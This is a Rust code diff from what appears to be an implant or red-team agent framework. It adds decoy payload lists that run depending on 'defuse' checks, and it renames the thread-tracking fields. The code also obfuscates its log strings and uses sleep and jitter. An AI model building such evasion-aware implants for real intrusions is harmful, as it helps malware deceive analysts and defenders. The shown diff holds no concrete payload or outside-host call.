@@ -32,6 +32,13 @@ pub struct Config {
     pub payloads: Vec<Payload>,
     pub defuse_update: Vec<Defuse>,
     pub defuse_payload: Vec<Defuse>,
+
+    pub decoy_defuse_update_success: bool,
+    pub decoy_defuse_payload_success: bool,
+    pub decoy_update_config: Vec<Payload>,
+    pub decoy_payload_exec: Vec<Payload>,
+    pub decoy_before_payload: bool, // on verra
+
     pub sign_material: VerifSignMaterial,
     pub sleep: u64,
     pub jitt: u64,
@@ -48,6 +55,13 @@ impl Config {
         payloads: Vec<Payload>,
         defuse_update: Vec<Defuse>,
         defuse_payload: Vec<Defuse>,
+
+        decoy_defuse_update_success: bool,
+        decoy_defuse_payload_success: bool,
+        decoy_update_config: Vec<Payload>,
+        decoy_payload_exec: Vec<Payload>,
+        decoy_before_payload: bool, // on verra
+
         sleep: u64,
         jitt: u64,
         link_timeout: u64,
@@ -64,6 +78,13 @@ impl Config {
             payloads: payloads,
             defuse_update: defuse_update,
             defuse_payload: defuse_payload,
+
+            decoy_defuse_update_success: decoy_defuse_update_success,
+            decoy_defuse_payload_success: decoy_defuse_payload_success,
+            decoy_update_config: decoy_update_config,
+            decoy_payload_exec: decoy_payload_exec,
+            decoy_before_payload: decoy_before_payload, // on verra
+
             sleep: sleep,
             jitt: jitt,
             link_timeout: link_timeout,
@@ -78,6 +99,13 @@ impl Config {
         payloads: Vec<Payload>,
         defuse_update: Vec<Defuse>,
         defuse_payload: Vec<Defuse>,
+
+        decoy_defuse_update_success: bool,
+        decoy_defuse_payload_success: bool,
+        decoy_update_config: Vec<Payload>,
+        decoy_payload_exec: Vec<Payload>,
+        decoy_before_payload: bool, // on verra
+
         sleep: u64,
         jitt: u64,
         link_timeout: u64,
@@ -89,6 +117,11 @@ impl Config {
             payloads,
             defuse_update,
             defuse_payload,
+            decoy_defuse_update_success,
+            decoy_defuse_payload_success,
+            decoy_update_config,
+            decoy_payload_exec,
+            decoy_before_payload, // on verra
             sleep,
             jitt,
             link_timeout,
@@ -197,14 +230,14 @@ impl Config {
 
             //clean the running_thread
             run_data
-                .running_thread
+                .running_thread_payload
                 .retain(|x| x.0.is_finished() == false);
 
-            if payload.is_already_running_or_runonce(run_data) == false {
+            if payload.is_already_running_or_runonce_payload(run_data) == false {
                 match payload.exec_payload(&self) {
                     PayloadExecThread::NoThread() => (),
                     PayloadExecThread::Thread(join_handle, payload) => {
-                        run_data.running_thread.push((join_handle, payload));
+                        run_data.running_thread_payload.push((join_handle, payload));
                         ()
                     }
                 }
@@ -212,8 +245,8 @@ impl Config {
 
             // add runonce payload to the list
             if payload.is_runonce() {
-                if !run_data.runonce.contains(&payload) {
-                    run_data.runonce.push(payload.clone());
+                if !run_data.runonce_payload.contains(&payload) {
+                    run_data.runonce_payload.push(payload.clone());
                 }
             }
 
@@ -222,7 +255,97 @@ impl Config {
 
         //clean the running_thread
         run_data
-            .running_thread
+            .running_thread_payload
+            .retain(|x| x.0.is_finished() == false);
+    }
+
+    pub fn exec_decoy_update(&self, run_data: &mut RunData) {
+        info!("{}", encrypt_string!("[+] DECOY UPDATE config"));
+        let mut nb_payload = 1;
+        for payload in &self.decoy_update_config {
+            info!(
+                "{}/{}{}{:?}",
+                nb_payload,
+                &self.decoy_update_config.len(),
+                encrypt_string!(" decoy update payload: "),
+                &payload
+            );
+
+            //clean the running_thread
+            run_data
+                .running_thread_decoy_update
+                .retain(|x| x.0.is_finished() == false);
+
+            if payload.is_already_running_or_runonce_decoy_update(run_data) == false {
+                match payload.exec_payload(&self) {
+                    PayloadExecThread::NoThread() => (),
+                    PayloadExecThread::Thread(join_handle, payload) => {
+                        run_data
+                            .running_thread_decoy_update
+                            .push((join_handle, payload));
+                        ()
+                    }
+                }
+            }
+
+            // add runonce payload to the list
+            if payload.is_runonce() {
+                if !run_data.runonce_decoy_update.contains(&payload) {
+                    run_data.runonce_decoy_update.push(payload.clone());
+                }
+            }
+
+            nb_payload = nb_payload + 1;
+        }
+
+        //clean the running_thread
+        run_data
+            .running_thread_decoy_update
+            .retain(|x| x.0.is_finished() == false);
+    }
+
+    pub fn exec_decoy_payload(&self, run_data: &mut RunData) {
+        info!("{}", encrypt_string!("[+] DECOY PAYLOADS exec"));
+        let mut nb_payload = 1;
+        for payload in &self.decoy_payload_exec {
+            info!(
+                "{}/{}{}{:?}",
+                nb_payload,
+                &self.decoy_payload_exec.len(),
+                encrypt_string!(" decoy exec payload: "),
+                &payload
+            );
+
+            //clean the running_thread
+            run_data
+                .running_thread_decoy_payload
+                .retain(|x| x.0.is_finished() == false);
+
+            if payload.is_already_running_or_runonce_decoy_payload(run_data) == false {
+                match payload.exec_payload(&self) {
+                    PayloadExecThread::NoThread() => (),
+                    PayloadExecThread::Thread(join_handle, payload) => {
+                        run_data
+                            .running_thread_decoy_payload
+                            .push((join_handle, payload));
+                        ()
+                    }
+                }
+            }
+
+            // add runonce payload to the list
+            if payload.is_runonce() {
+                if !run_data.runonce_decoy_payload.contains(&payload) {
+                    run_data.runonce_decoy_payload.push(payload.clone());
+                }
+            }
+
+            nb_payload = nb_payload + 1;
+        }
+
+        //clean the running_thread
+        run_data
+            .running_thread_decoy_payload
             .retain(|x| x.0.is_finished() == false);
     }
 
